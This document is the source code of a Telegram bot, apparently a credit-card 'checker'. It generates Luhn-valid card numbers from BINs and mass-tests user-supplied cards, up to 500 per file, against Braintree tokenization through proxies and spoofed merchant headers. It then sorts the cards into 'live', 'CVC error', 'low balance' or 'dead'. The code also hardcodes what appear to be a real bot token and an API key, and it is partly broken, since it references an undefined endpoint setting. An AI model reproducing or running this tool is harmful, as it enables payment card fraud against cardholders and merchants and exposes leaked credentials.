import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8388599467:AAHpsWxvSma5U_QFMqOa-qilroPGO9m5hKk'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    try:
        response = requests.get('https://api.stripe.com', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10, verify=False)
        return response.status_code in [200, 301, 302, 403, 404]
    except:
        return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        return True, "✅ Proxy is live and set successfully!"
    return False, "❌ Proxy is dead or unreachable"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "✅ Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

CONFIG = {
    "api_url": "https://api.braintreegateway.com/merchants/your_merchant_id/client_api/v1/payment_methods/credit_cards",
    "retry_count": 3,
    "retry_delay": 2,
}

user_sessions = {}
user_cooldowns = {}
COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10
MAX_FILE_CARDS = 500
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
        try:
            response = requests.get(f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): info['type'] = str(data['Type']).title()
                if data.get('Category'): info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): info['bank'] = str(data['Issuer']).title()
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): info['brand'] = data['scheme'].upper()
            if data.get('type'): info['type'] = data['type'].title()
            if data.get('brand'): info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    if card_number[0] == '4': info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

def calculate_luhn_digit(partial_card):
    digits = [int(d) for d in str(partial_card) + '0']
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return (10 - (checksum % 10)) % 10

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        # Use provided month/year or generate random
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            bot.send_message(message.chat.id, "⛔ <b>Access Denied</b>\n\nYou need admin approval to use this bot.\nUse /request to request access.", parse_mode='HTML')
            return
        return func(message)
    return wrapper

def generate_user_agent():
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ])

class CardChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.headers = {
            'user-agent': generate_user_agent(),
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.easternmarine.com',
            'referer': 'https://www.easternmarine.com/',
        }
        self.session = requests.Session()
        
    def fetch_braintree_token(self):
        for attempt in range(CONFIG['retry_count']):
            try:
                response = self.session.get(CONFIG["api_url"], headers=self.headers, proxies=get_proxies(), verify=False, timeout=30)
                if response.status_code == 200:
                    # Extract Braintree authorization token
                    auth_match = re.search(r'client_api_url.*?production.*?([a-zA-Z0-9]{160,})', response.text)
                    if not auth_match:
                        auth_match = re.search(r'authorization.*?["\']([a-zA-Z0-9]{100,})["\']', response.text)
                    if not auth_match:
                        auth_match = re.search(r'data-braintree-authorization.*?["\']([^"\']+)["\']', response.text)
                    
                    if auth_match:
                        return auth_match.group(1)
                
                if attempt < CONFIG['retry_count'] - 1:
                    time.sleep(CONFIG['retry_delay'])
            except:
                if attempt < CONFIG['retry_count'] - 1:
                    time.sleep(CONFIG['retry_delay'])
        return None
    
    def validate_card(self, card):
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '⚠️'}
            number, exp_month, exp_year, cvv = parts
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '⚠️'}
            card_info = get_card_info(number)
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '⚠️', 'card_info': card_info}
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '⚠️'}
        
        auth_token = self.fetch_braintree_token()
        if not auth_token:
            return {'status': 'error', 'message': 'Failed to fetch Braintree token', 'icon': '⚠️', 'card_info': card_info}
        
        # Braintree GraphQL mutation
        braintree_data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": number,
                        "expirationMonth": exp_month,
                        "expirationYear": exp_year,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        self.headers['authorization'] = f'Bearer {auth_token}'
        self.headers['braintree-version'] = '2018-05-10'
        
        try:
            braintree_response = self.session.post(CONFIG["braintree_url"], headers=self.headers, json=braintree_data, proxies=get_proxies(), verify=False, timeout=30)
            response_json = braintree_response.json()
            
            if 'errors' in response_json:
                error_msg = response_json['errors'][0].get('message', 'Card Declined')
                
                # Check specific error messages
                if 'cvv' in error_msg.lower() or 'security code' in error_msg.lower():
                    return {'status': 'live_cvc', 'message': '🔵 Invalid CVC', 'icon': '🔵', 'card_info': card_info}
                elif 'insufficient' in error_msg.lower():
                    return {'status': 'insufficient', 'message': '🟡 Low Balance', 'icon': '🟡', 'card_info': card_info}
                elif 'processor declined' in error_msg.lower() or 'do not honor' in error_msg.lower():
                    return {'status': 'dead', 'message': f'❌ {error_msg}', 'icon': '🔴', 'card_info': card_info}
                else:
                    return {'status': 'dead', 'message': f'❌ {error_msg}', 'icon': '🔴', 'card_info': card_info}
            
            if 'data' in response_json and response_json['data'].get('tokenizeCreditCard'):
                token_data = response_json['data']['tokenizeCreditCard']
                if token_data.get('token'):
                    # Card tokenized successfully - now verify with a transaction attempt
                    return self.verify_with_transaction(token_data['token'], card_info)
            
            return {'status': 'error', 'message': 'Unknown response', 'icon': '⚠️', 'card_info': card_info}
        except Exception as e:
            return {'status': 'error', 'message': f'Error: {str(e)}', 'icon': '⚠️', 'card_info': card_info}
    
    def verify_with_transaction(self, token, card_info):
        # Attempt a small verification transaction
        verify_data = {
            "query": "mutation($input: VerifyPaymentMethodInput!) { verifyPaymentMethod(input: $input) { verification { status riskData { decision } } } }",
            "variables": {
                "input": {
                    "paymentMethodId": token
                }
            }
        }
        
        try:
            verify_response = self.session.post(CONFIG["braintree_url"], headers=self.headers, json=verify_data, proxies=get_proxies(), verify=False, timeout=30)
            verify_json = verify_response.json()
            
            if 'data' in verify_json and verify_json['data'].get('verifyPaymentMethod'):
                verification = verify_json['data']['verifyPaymentMethod'].get('verification', {})
                status = verification.get('status', '').lower()
                
                if status in ['verified', 'gateway_rejected']:
                    return {'status': 'live', 'message': '✅ Card Live', 'icon': '🟢', 'card_info': card_info}
                elif 'processor_declined' in status:
                    return {'status': 'dead', 'message': '❌ Processor Declined', 'icon': '🔴', 'card_info': card_info}
            
            # If tokenization succeeded, card is likely valid
            return {'status': 'live', 'message': '✅ Card Live (Tokenized)', 'icon': '🟢', 'card_info': card_info}
        except:
            # If verification fails but tokenization succeeded, card is still valid
            return {'status': 'live', 'message': '✅ Card Live (Tokenized)', 'icon': '🟢', 'card_info': card_info}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "🎴 <b>CARD VALIDATION BOT</b> 🎴\n\n<b>⚠️ ACCESS REQUIRED ⚠️</b>\n\nYou need admin approval to use this bot.\n\nUse /request to request access from the admin."
    else:
        text = "🎴 <b>CARD VALIDATION BOT</b> 🎴\n\n<b>⚠️ YOSH CARD VALIDATOR ⚠️</b>\n\n<b>Commands:</b>\n/bchk [card] - Check single card (B3)\n/bmass [cards] - Check multiple cards (B3)\n/file - Upload TXT file with cards\n/bin [bin] - BIN lookup\n/gen [bin] [quantity] - Generate test cards\n/help - Show help\n\n<b>Admin Commands:</b>\n/proxy [url] - Set proxy\n/removeproxy - Remove proxy\n/proxystatus - Check proxy status\n/users - List approved users\n/pending - List pending requests"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        bot.send_message(message.chat.id, "✅ You already have access to the bot!", parse_mode='HTML')
        return
    if user_id in pending_requests:
        bot.send_message(message.chat.id, "⏳ Your request is already pending. Please wait for admin approval.", parse_mode='HTML')
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {'username': username, 'name': full_name, 'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
               types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}"))
    
    admin_msg = f"🔔 <b>New Access Request</b>\n\n👤 <b>User Info:</b>\n• Name: {full_name}\n• Username: @{username}\n• User ID: <code>{user_id}</code>\n• Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nDo you want to approve this user?"
    bot.send_message(ADMIN_ID, admin_msg, parse_mode='HTML', reply_markup=markup)
    bot.send_message(message.chat.id, "✅ <b>Request Sent</b>\n\nYour access request has been sent to the admin. Please wait for approval.", parse_mode='HTML')

@bot.message_handler(commands=['approve', 'deny', 'remove'])
def admin_user_commands(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, f"Usage: /{command_parts[0].strip('/')} <user_id>", parse_mode='HTML')
            return
        user_id = int(command_parts[1])
        
        if message.text.startswith('/approve'):
            approved_users.add(user_id)
            pending_requests.pop(user_id, None)
            save_users()
            bot.send_message(message.chat.id, f"✅ User {user_id} has been approved!", parse_mode='HTML')
            try:
                bot.send_message(user_id, "🎉 <b>Access Approved!</b>\n\nYou can now use the bot. Type /start to begin.", parse_mode='HTML')
            except:
                pass
        elif message.text.startswith('/deny'):
            pending_requests.pop(user_id, None)
            save_users()
            bot.send_message(message.chat.id, f"❌ User {user_id} has been denied.", parse_mode='HTML')
            try:
                bot.send_message(user_id, "❌ <b>Access Denied</b>\n\nYour request has been denied by the admin.", parse_mode='HTML')
            except:
                pass
        elif message.text.startswith('/remove'):
            if user_id in approved_users:
                approved_users.remove(user_id)
                save_users()
                bot.send_message(message.chat.id, f"✅ User {user_id} has been removed.", parse_mode='HTML')
                try:
                    bot.send_message(user_id, "⛔ <b>Access Revoked</b>\n\nYour access to the bot has been revoked.", parse_mode='HTML')
                except:
                    pass
            else:
                bot.send_message(message.chat.id, f"❌ User {user_id} is not in approved list.", parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ Invalid user ID", parse_mode='HTML')

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    if not approved_users:
        bot.send_message(message.chat.id, "📋 No approved users yet.", parse_mode='HTML')
        return
    text = "📋 <b>Approved Users:</b>\n\n" + "\n".join([f"• User ID: <code>{uid}</code>" for uid in approved_users])
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['pending'])
def list_pending_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    if not pending_requests:
        bot.send_message(message.chat.id, "📋 No pending requests.", parse_mode='HTML')
        return
    text = "📋 <b>Pending Requests:</b>\n\n"
    for user_id, info in pending_requests.items():
        text += f"👤 {info['name']}\n• Username: @{info['username']}\n• ID: <code>{user_id}</code>\n• Date: {info['date']}\n\n"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['help'])
@require_approval
def send_help(message):
    text = "<b>📖 HOW TO USE</b>\n\n<b>Direct Check (B3):</b>\n<code>/bchk 4532123456789012|12|25|123</code>\n\n<b>BIN Lookup:</b>\n<code>/bin 453212</code>\n\n<b>Generate Cards:</b>\n<code>/gen 453212 5</code>\nGenerates 5 test cards from BIN 453212\n\n<b>Mass Check (B3):</b>\n<code>/bmass 4532123456789012|12|25|123\n4532987654321098|11|26|456</code>\n\n<b>File Upload:</b>\nUse <code>/file</code> then upload a .txt file with cards (one per line)\n\n<b>Format:</b> number|month|year|cvv\n\n<b>Results:</b>\n🟢 Live - Card works\n🔵 CVC Error - Invalid CVC\n🟡 Low Balance - Insufficient funds\n🔴 Dead - Card declined"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['bin'])
@require_approval
def check_bin(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.send_message(message.chat.id, "❌ <b>Invalid Format</b>\n\nUsage: <code>/bin 464995</code>", parse_mode='HTML')
        return
    bin_number = command_parts[1].strip()
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.send_message(message.chat.id, "❌ <b>Invalid BIN</b>\n\nBIN must be at least 6 digits", parse_mode='HTML')
        return
    
    status_msg = bot.send_message(message.chat.id, "🔍 <b>Looking up BIN...</b>", parse_mode='HTML')
    card_info = get_card_info(bin_number.ljust(16, '0'))
    
    response = f"╔══════════════════════╗\n   <b>BIN LOOKUP RESULT</b>\n╚══════════════════════╝\n\n🔢 <b>BIN:</b> <code>{bin_number}</code>\n\n💳 <b>Brand:</b> {card_info.get('brand', 'Unknown')}\n📝 <b>Type:</b> {card_info.get('type', 'Unknown')}\n💎 <b>Level:</b> {card_info.get('level', 'Unknown')}\n🏦 <b>Bank:</b> {card_info.get('bank', 'Unknown')}\n🌍 <b>Country:</b> {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n<b>Checked by:</b> @{message.from_user.username or 'User'}\n<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.send_message(message.chat.id, "❌ <b>Invalid Format</b>\n\nUsage:\n<code>/gen 453212 10</code> - Random date\n<code>/gen 453212|06|30 10</code> - Specific date\n\nMax: 20 cards per request", parse_mode='HTML')
        return
    
    # Extract BIN and date from input
    bin_input = command_parts[1].strip()
    exp_month = None
    exp_year = None
    
    # Check if date is provided in format: BIN|MM|YY
    if '|' in bin_input:
        parts = bin_input.split('|')
        bin_input = parts[0]
        if len(parts) >= 3:
            try:
                exp_month = parts[1].strip()
                exp_year = parts[2].strip()
            except:
                pass
    
    # Remove 'x' characters and extract digits
    bin_input = bin_input.replace('x', '').replace('X', '')
    bin_number = ''.join(c for c in bin_input if c.isdigit())
    
    quantity = 10
    if len(command_parts) > 2:
        try:
            quantity = int(command_parts[2])
        except:
            quantity = 10
    
    if not bin_number or len(bin_number) < 6:
        bot.send_message(message.chat.id, "❌ <b>Invalid BIN</b>\n\nBIN must be at least 6 digits\n\nExamples:\n<code>/gen 625814 10</code>\n<code>/gen 625814|06|30 5</code>\n<code>/gen 6258142602xxxx|12|28 15</code>", parse_mode='HTML')
        return
    
    # Use only first 6-8 digits as BIN
    bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
    
    status_msg = bot.send_message(message.chat.id, f"🔄 <b>Generating {quantity} cards...</b>", parse_mode='HTML')
    
    cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
    if error:
        bot.edit_message_text(f"❌ <b>Error:</b> {error}", message.chat.id, status_msg.message_id, parse_mode='HTML')
        return
    
    card_info = get_card_info(bin_number.ljust(16, '0'))
    
    date_info = f"Random dates" if not exp_month else f"Date: {exp_month}/{exp_year}"
    response = f"╔══════════════════════╗\n   <b>GENERATED CARDS</b>\n╚══════════════════════╝\n\n🔢 <b>BIN:</b> <code>{bin_number}</code>\n💳 <b>Brand:</b> {card_info.get('brand', 'Unknown')}\n🌍 <b>Country:</b> {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n🏦 <b>Bank:</b> {card_info.get('bank', 'Unknown')}\n📅 <b>Expiry:</b> {date_info}\n\n<b>Generated {len(cards)} Cards:</b>\n\n"
    
    for card in cards:
        response += f"<code>{card}</code>\n"
    
    response += f"\n⚠️ <b>Disclaimer:</b> For testing purposes only\n\n<b>Generated by:</b> @{message.from_user.username or 'User'}\n<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bchk'])
@require_approval
def start_check(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'check')
    if not can_proceed:
        bot.send_message(message.chat.id, f"⏳ <b>Cooldown Active</b>\n\nPlease wait {remaining} seconds before using /bchk again", parse_mode='HTML')
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.send_message(message.chat.id, "❌ <b>Invalid Format</b>\n\nUsage: <code>/bchk card|mm|yy|cvv</code>", parse_mode='HTML')
        return
    
    status_msg = bot.send_message(message.chat.id, "🔄 <b>Processing...</b>", parse_mode='HTML')
    checker = CardChecker(message.chat.id)
    result = checker.validate_card(command_parts[1].strip())
    card_info = result.get('card_info', {})
    
    response = f"╔══════════════════════╗\n   <b>CARD VALIDATION RESULT</b>\n   <b>Gateway: Braintree (B3)</b>\n╚══════════════════════╝\n\n<b>Card:</b> <code>{command_parts[1].strip()}</code>\n\n<b>Status:</b> {result['icon']} {result['message']}\n\n<b>Card Info:</b>\n• Brand: {card_info.get('brand', 'Unknown')}\n• Type: {card_info.get('type', 'Unknown')}\n• Level: {card_info.get('level', 'Unknown')}\n• Bank: {card_info.get('bank', 'Unknown')}\n• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n<b>Checked by:</b> @{message.from_user.username or 'User'}\n<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bmass'])
@require_approval
def start_mass_check(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        bot.send_message(message.chat.id, f"⏳ <b>Cooldown Active</b>\n\nPlease wait {remaining} seconds before using /bmass again", parse_mode='HTML')
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.send_message(message.chat.id, "❌ <b>Invalid Format</b>\n\nUsage: <code>/bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv</code>", parse_mode='HTML')
        return
    
    cards = [c.strip() for c in command_parts[1].strip().split('\n') if c.strip()]
    if len(cards) > MAX_MASS_CARDS:
        bot.send_message(message.chat.id, f"❌ <b>Too Many Cards</b>\n\nMaximum {MAX_MASS_CARDS} cards per mass check", parse_mode='HTML')
        return
    
    status_msg = bot.send_message(message.chat.id, f"🔄 <b>Processing {len(cards)} cards...</b>", parse_mode='HTML')
    checker = CardChecker(message.chat.id)
    results = {'live': [], 'live_cvc': [], 'insufficient': [], 'dead': [], 'error': []}
    
    for i, card in enumerate(cards):
        result = checker.validate_card(card)
        if result['status'] in results:
            results[result['status']].append({'card': card, 'result': result})
        if (i + 1) % 3 == 0 or (i + 1) == len(cards):
            bot.edit_message_text(f"🔄 <b>Processing...</b>\n\nChecked: {i + 1}/{len(cards)}", message.chat.id, status_msg.message_id, parse_mode='HTML')
    
    response = f"╔══════════════════════╗\n   <b>MASS CHECK RESULTS</b>\n   <b>Gateway: Braintree (B3)</b>\n╚══════════════════════╝\n\n<b>Total Checked:</b> {len(cards)}\n<b>Live:</b> 🟢 {len(results['live'])}\n<b>Live (CVC Error):</b> 🔵 {len(results['live_cvc'])}\n<b>Low Balance:</b> 🟡 {len(results['insufficient'])}\n<b>Dead:</b> 🔴 {len(results['dead'])}\n<b>Errors:</b> ⚠️ {len(results['error'])}\n\n"
    if results['live']:
        response += "\n🟢 <b>LIVE CARDS:</b>\n"
        for item in results['live']:
            ci = item['result'].get('card_info', {})
            response += f"<code>{item['card']}</code>\n  {ci.get('flag', '🌍')} {ci.get('brand', 'Unknown')} | {ci.get('bank', 'Unknown')}\n"
    if results['live_cvc']:
        response += f"\n🔵 <b>LIVE (CVC ERROR):</b> {len(results['live_cvc'])} cards\n"
    if results['insufficient']:
        response += f"\n🟡 <b>LOW BALANCE:</b> {len(results['insufficient'])} cards\n"
    response += f"\n<b>Checked by:</b> @{message.from_user.username or 'User'}\n<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['file'])
@require_approval
def request_file(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        bot.send_message(message.chat.id, f"⏳ <b>Cooldown Active</b>\n\nPlease wait {remaining} seconds", parse_mode='HTML')
        return
    user_sessions[message.chat.id] = {'awaiting_file': True}
    bot.send_message(message.chat.id, "📁 <b>Upload File</b>\n\nSend me a .txt file with cards (one per line)\nFormat: <code>card|mm|yy|cvv</code>", parse_mode='HTML')

@bot.message_handler(content_types=['document'])
@require_approval
def handle_file(message):
    if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
        bot.send_message(message.chat.id, "❌ Use /file first to upload a card file", parse_mode='HTML')
        return
    user_sessions[message.chat.id]['awaiting_file'] = False
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(message.chat.id, "❌ Please send a .txt file", parse_mode='HTML')
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = [c.strip() for c in downloaded_file.decode('utf-8').split('\n') if c.strip() and '|' in c]
        
        if not cards:
            bot.send_message(message.chat.id, "❌ No valid cards found in file", parse_mode='HTML')
            return
        if len(cards) > MAX_FILE_CARDS:
            bot.send_message(message.chat.id, f"❌ <b>Too Many Cards</b>\n\nMaximum {MAX_FILE_CARDS} cards per file\nFound: {len(cards)}", parse_mode='HTML')
            return
        
        status_msg = bot.send_message(message.chat.id, f"🔄 <b>Processing {len(cards)} cards from file...</b>", parse_mode='HTML')
        checker = CardChecker(message.chat.id)
        results = {'live': [], 'live_cvc': [], 'insufficient': [], 'dead': [], 'error': []}
        
        for i, card in enumerate(cards):
            result = checker.validate_card(card)
            if result['status'] in results:
                results[result['status']].append({'card': card, 'result': result})
            if (i + 1) % 10 == 0 or (i + 1) == len(cards):
                bot.edit_message_text(f"🔄 <b>Processing...</b>\n\nChecked: {i + 1}/{len(cards)}", message.chat.id, status_msg.message_id, parse_mode='HTML')
        
        response = f"╔══════════════════════╗\n   <b>FILE CHECK RESULTS</b>\n   <b>Gateway: Braintree (B3)</b>\n╚══════════════════════╝\n\n<b>Total Checked:</b> {len(cards)}\n<b>Live:</b> 🟢 {len(results['live'])}\n<b>Live (CVC Error):</b> 🔵 {len(results['live_cvc'])}\n<b>Low Balance:</b> 🟡 {len(results['insufficient'])}\n<b>Dead:</b> 🔴 {len(results['dead'])}\n<b>Errors:</b> ⚠️ {len(results['error'])}\n\n"
        if results['live']:
            response += "\n🟢 <b>LIVE CARDS:</b>\n"
            for item in results['live'][:20]:
                ci = item['result'].get('card_info', {})
                response += f"<code>{item['card']}</code>\n  {ci.get('flag', '🌍')} {ci.get('brand', 'Unknown')} | {ci.get('bank', 'Unknown')}\n"
            if len(results['live']) > 20:
                response += f"\n... and {len(results['live']) - 20} more live cards\n"
        if results['live_cvc']:
            response += f"\n🔵 <b>LIVE (CVC ERROR):</b> {len(results['live_cvc'])} cards\n"
        if results['insufficient']:
            response += f"\n🟡 <b>LOW BALANCE:</b> {len(results['insufficient'])} cards\n"
        response += f"\n<b>Checked by:</b> @{message.from_user.username or 'User'}\n<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Error processing file:</b>\n{str(e)}", parse_mode='HTML')

@bot.message_handler(commands=['proxy'])
def handle_proxy(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.send_message(message.chat.id, "Usage: /proxy http://user:pass@host:port", parse_mode='HTML')
        return
    status_msg = bot.send_message(message.chat.id, "🔄 Testing proxy...", parse_mode='HTML')
    success, msg = set_proxy(command_parts[1].strip())
    bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['removeproxy'])
def handle_remove_proxy(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    bot.send_message(message.chat.id, remove_proxy(), parse_mode='HTML')

@bot.message_handler(commands=['proxystatus'])
def handle_proxy_status(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Admin only command")
        return
    text = f"✅ <b>Proxy Active</b>\n\n<code>{ACTIVE_PROXY}</code>" if ACTIVE_PROXY else "❌ <b>No Proxy Set</b>\n\nUsing direct connection."
